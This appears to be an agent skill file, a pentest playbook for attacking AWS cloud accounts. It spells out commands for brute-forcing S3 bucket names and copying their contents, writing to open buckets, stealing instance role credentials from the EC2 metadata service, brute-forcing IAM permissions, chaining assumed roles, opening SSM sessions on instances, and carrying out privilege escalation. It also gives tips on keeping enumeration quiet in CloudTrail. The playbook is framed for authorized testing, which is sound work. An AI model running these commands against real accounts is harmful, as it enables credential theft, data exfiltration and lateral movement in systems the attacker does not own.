---
name: aws-attack
description: >
  AWS cloud attack surface enumeration and exploitation for authorized
  engagements: S3 bucket misconfiguration, IAM policy enumeration and
  privilege escalation paths, Lambda function abuse, EC2 instance metadata
  (IMDSv1/v2) credential theft, SSM abuse, STS assume-role chains and
  cross-account trust abuse. Keywords: AWS, S3, IAM, Lambda, EC2, IMDS,
  STS, SSM, cloud pentest, pacu, scoutsuite. Do NOT use for Azure or GCP
  (see azure-attack / gcp-attack), or for generic Linux host privesc once
  you are already on an EC2 instance's OS (see linux-privesc).
metadata:
  type: platform
  phase: hunting
  tools: [aws-cli, pacu, scoutsuite, cloudfox, s3scanner, prowler, enumerate-iam, bucket_finder]
depends_on: [subdomain-discovery, cloud-recon]
feeds_into: [chain-analysis, privesc-report]
chains_with: [linux-privesc, windows-privesc, active-directory, kubernetes-attack]
---

## Signals
- Target uses `*.s3.amazonaws.com`, `*.cloudfront.net`, `*.execute-api.*.amazonaws.com`, or Elastic Beanstalk/Amplify domains.
- Leaked `AKIA...`/`ASIA...` access keys in git history, JS bundles, CI logs, or error messages.
- SSRF vulnerability in a web app running on EC2 (classic IMDS credential theft vector).
- `.env`, Docker images, or Lambda layers containing `AWS_SECRET_ACCESS_KEY`.
- Subdomain takeover candidates pointing at unclaimed S3 buckets or CloudFront distributions.

## Prerequisites
- Explicit written authorization naming the AWS account ID(s)/org in scope. AWS ToS requires this; unauthorized scanning of AWS infra can trigger AWS Trust & Safety abuse reports regardless of client authorization if third-party assets are touched.
- At least one credential set (even unauthenticated/anonymous access to a bucket counts) or a confirmed SSRF/RCE foothold.
- `aws-cli` v2 configured, `pacu`, `cloudfox`, `prowler` installed.

## Methodology

### 1. Unauthenticated recon
```bash
# Enumerate likely bucket names
echo -e "target\ntarget-prod\ntarget-dev\ntarget-backup\ntarget-assets" > buckets.txt
while read b; do
  aws s3 ls s3://$b --no-sign-request 2>&1 | grep -v "NoSuchBucket\|AccessDenied" && echo "[+] $b open"
done < buckets.txt

# Or with a dedicated scanner
python3 s3scanner.py -f buckets.txt --dump

# CloudFront / Elastic Beanstalk fingerprint
curl -sI https://target.com | grep -i "x-amz-cf-id\|server"
```

### 2. Identify the caller for any credential found
```bash
aws sts get-caller-identity --profile found-creds
# -> confirms account ID, user/role ARN, whether creds are even valid
```

### 3. IAM enumeration (brute-force if `iam:Get*`/`List*` denied)
```bash
# If you have some creds, enumerate permissions without triggering CloudTrail-visible denials loudly
python3 enumerate-iam.py --access-key AKIA... --secret-key ...

# With pacu
pacu
> import_keys found-creds
> run iam__enum_permissions
> run iam__enum_users_roles_policies_groups
```

### 4. S3 bucket misconfig exploitation
```bash
aws s3 ls s3://target-backup --no-sign-request
aws s3 sync s3://target-backup ./loot --no-sign-request
# Writable bucket check (potential stored XSS / supply-chain if served via CloudFront)
echo "poc" > /tmp/poc.txt && aws s3 cp /tmp/poc.txt s3://target-backup/poc.txt --no-sign-request
```

### 5. EC2 metadata credential theft (via SSRF/RCE foothold)
```bash
# IMDSv1 (no token needed) — flag as finding on its own if reachable
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# IMDSv2 (token required — still abusable via SSRF that can set headers, e.g. PUT support)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

### 6. Lambda abuse
```bash
# Enumerate functions and their env vars / resource policies if iam:List/Get allowed
aws lambda list-functions --profile found-creds
aws lambda get-function --function-name target-fn --profile found-creds
aws lambda get-policy --function-name target-fn --profile found-creds
# Check for overly permissive resource policy allowing public invoke
aws lambda get-function-configuration --function-name target-fn --query Environment
```

### 7. STS assume-role chain abuse
```bash
aws sts get-caller-identity --profile found-creds
# Enumerate roles you can assume (trust policy misconfig, wildcard principals)
aws iam list-roles --profile found-creds
aws iam get-role --role-name over-permissive-role --profile found-creds
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/over-permissive-role --role-session-name pwn --profile found-creds
```

### 8. Privilege escalation path mapping
```bash
pacu
> run iam__privesc_scan
# or
cloudfox permissions --profile found-creds
cloudfox iam-simulator --profile found-creds
```

### 9. SSM for lateral movement to EC2 instances
```bash
aws ssm describe-instance-information --profile found-creds
aws ssm start-session --target i-0123456789abcdef0 --profile found-creds
```

## Tooling
`pacu`, `cloudfox`, `ScoutSuite`, `prowler`, `enumerate-iam.py`, `s3scanner`, `aws-cli` v2, `bucket_finder`, `TruffleHog`/`gitleaks` for leaked key discovery.

## Validation Gate
- Confirm `sts:get-caller-identity` succeeds before claiming a credential is valid — a key that parses correctly is not evidence of access.
- Every privesc path found via `iam__privesc_scan` or `cloudfox` must be confirmed by actually executing the escalation (e.g. actually calling `iam:CreatePolicyVersion` on a test policy, or actually assuming the role), not just citing the simulated permission — IAM policy evaluation has many edge cases (SCPs, permission boundaries, explicit denies) that static analysis misses.
- Screenshot/log the `aws sts get-caller-identity` output before and after privesc to prove the identity change.

## Gotchas
- Organizations with SCPs (Service Control Policies) can deny an action even if the IAM policy allows it — a `pacu` finding of "allowed" can be a false positive.
- `aws-cli --no-sign-request` only works for genuinely public/anonymous-access resources; it does not bypass bucket policies requiring specific principals.
- CloudTrail logs every API call including denied ones — assume the client's SOC may see noisy enumeration; throttle and use `--profile` isolation per engagement.
- Many S3 "misconfigs" are actually intentional static-website hosting buckets — confirm actual sensitivity of exposed data before reporting as a finding.
- IMDSv2-only enforcement (`HttpTokens: required`) blocks the classic SSRF-to-credential-theft chain unless the SSRF can also inject arbitrary headers (PUT) — note this distinction in the report.
